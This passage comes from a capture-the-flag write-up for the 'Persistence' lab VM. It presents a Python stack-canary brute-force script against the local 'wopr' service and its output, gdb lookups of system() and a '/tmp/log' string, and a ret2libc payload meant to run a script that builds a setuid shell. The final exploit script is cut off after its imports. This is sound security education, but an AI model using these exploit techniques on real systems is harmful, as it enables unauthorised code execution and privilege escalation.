+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes before the first canary bit is hit</span>
+</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>         <span class="c"># the canary</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
+</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># prepare the byte</span>
+</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># prepare the payload</span>
+</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Trying: &#39;</span><span class="se">\\</span><span class="s">x{0}&#39; in payload &#39;</span><span class="si">%s</span><span class="s">&#39; (</span><span class="si">%d</span><span class="s">:</span><span class="si">%d</span><span class="s">/255)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="n">send</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">canary_byte</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># get the inital banners</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># send the payload  </span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
+</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
+</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[!!] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
+</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>            <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit. No luck&quot;</span>
+</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary seems to be {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
+</span><span class='line'><span class="k">else</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[-] Unable to brute canary&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>An example run of this would end as follows:</p>
+
+<figure class='code'><figcaption><span>Running canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8d&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:141/255<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8e&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:142/255<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8f&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:143/255<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x90&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:144/255<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>!!<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;90&#39;</span>!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary seems to be 00ef8d90
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>
+
+<h2>wopr &ndash; NX and EIP</h2>
+
+<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>
+
+<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>
+
+<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>
+
+<figure class='code'><figcaption><span>ASLR check</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>
+
+<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>
+
+<figure class='code'><figcaption><span>finding system()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+</span><span class='line'>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>gdb -q /usr/bin/telnet
+</span><span class='line'>Reading symbols from /usr/bin/telnet...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># set a breakpoint to stop the flow once we hit the main() func</span>
+</span><span class='line'>Breakpoint 1 at 0x7b90
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># run the program</span>
+</span><span class='line'>Starting program: /usr/bin/telnet
+</span><span class='line'>Breakpoint 1, 0x00117b90 in main <span class="o">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># We hit our breakpoint, lets leak the address for system()</span>
+</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e56210 &lt;system&gt;
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>
+
+<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>
+
+<figure class='code'><figcaption><span>Stack after memory corruption up to EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
+</span><span class='line'>
+</span><span class='line'>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
+</span><span class='line'> ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
+</span><span class='line'>
+</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>
+
+<h2>wopr &ndash; code exec</h2>
+
+<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>
+
+<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>
+
+<p>I tried to put a command in a env variable and failed.<br/>
+I attempted to write a ROP chain and failed.</p>
+
+<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>
+
+<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>
+
+<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>
+
+<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>
+
+<figure class='code'><figcaption><span>wopr strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# strings  wopr
+</span><span class='line'>/lib/ld-linux.so.2
+</span><span class='line'>__gmon_start__
+</span><span class='line'>libc.so.6
+</span><span class='line'>_IO_stdin_used
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>.. snip ..<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
+</span><span class='line'>socket
+</span><span class='line'>setsockopt
+</span><span class='line'><span class="nb">bind</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
+</span><span class='line'>listen
+</span><span class='line'>/tmp/log          <span class="c"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
+</span><span class='line'>TMPLOG
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
+</span><span class='line'>accept
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>
+
+<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>
+
+<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>
+
+<figure class='code'><figcaption><span>finding</span><a href='http://leonjza.github.io/tmp/log'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
+</span><span class='line'>Reading symbols from wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>b *main
+</span><span class='line'>Breakpoint 1 at 0x80487de
+</span><span class='line'>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
+</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
+</span><span class='line'>ECX: 0x66a6f92e
+</span><span class='line'>EDX: 0x1
+</span><span class='line'>ESI: 0x0
+</span><span class='line'>EDI: 0x0
+</span><span class='line'>EBP: 0xbffff478 --&gt; 0x0
+</span><span class='line'>ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
+</span><span class='line'>EIP: 0x80487de <span class="o">(</span>&lt;main&gt;: push   ebp<span class="o">)</span>
+</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
+</span><span class='line'>   0x80487dc &lt;get_reply+104&gt;:   leave
+</span><span class='line'>   0x80487dd &lt;get_reply+105&gt;:   <span class="nv">ret</span>
+</span><span class='line'><span class="o">=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
+</span><span class='line'>   0x80487df &lt;main+1&gt;:  mov    ebp,esp
+</span><span class='line'>   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
+</span><span class='line'>   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+</span><span class='line'>   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x23c<span class="o">]</span>,eax
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
+</span><span class='line'>0004<span class="p">|</span> 0xbffff400 --&gt; 0x1
+</span><span class='line'>0008<span class="p">|</span> 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
+</span><span class='line'>0012<span class="p">|</span> 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span class="o">(</span><span class="s2">&quot;SSH_AGENT_PID=3171&quot;</span><span class="o">)</span>
+</span><span class='line'>0016<span class="p">|</span> 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
+</span><span class='line'>0020<span class="p">|</span> 0xbffff410 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
+</span><span class='line'>0024<span class="p">|</span> 0xbffff414 --&gt; 0xffffffff
+</span><span class='line'>0028<span class="p">|</span> 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Breakpoint 1, 0x080487de in main <span class="o">()</span>
+</span><span class='line'>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>searchmem /tmp/log
+</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;/tmp/log&#39;</span> in: None ranges
+</span><span class='line'>Found 2 results, display max 2 items:
+</span><span class='line'>wopr : 0x8048c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
+</span><span class='line'>wopr : 0x8049c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>
+
+<h2>wopr &ndash; the exploit</h2>
+
+<p>To sum up what we have to do to exploit this, we can say that we have to:</p>
+
+<ul>
+<li>Provide a string of size 30</li>
+<li>Provide the canary we have brute forced</li>
+<li>Pad with 4 bytes</li>
+<li>Write EIP to the location of <code>system()</code></li>
+<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
+<li>Provide the location of <code>/tmp/log</code></li>
+</ul>
+
+
+<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;AAAA&quot; +
+</span><span class='line'>&quot;\x10\xc2\x16\x00&quot; + &quot;JUNK&quot; + &quot;\x60\x8c\x04\x08&quot;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I finished up coding the exploit, which eventually resulted in the following:</p>
+
+<figure class='code'><figcaption><span>Persistence Sploit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'>
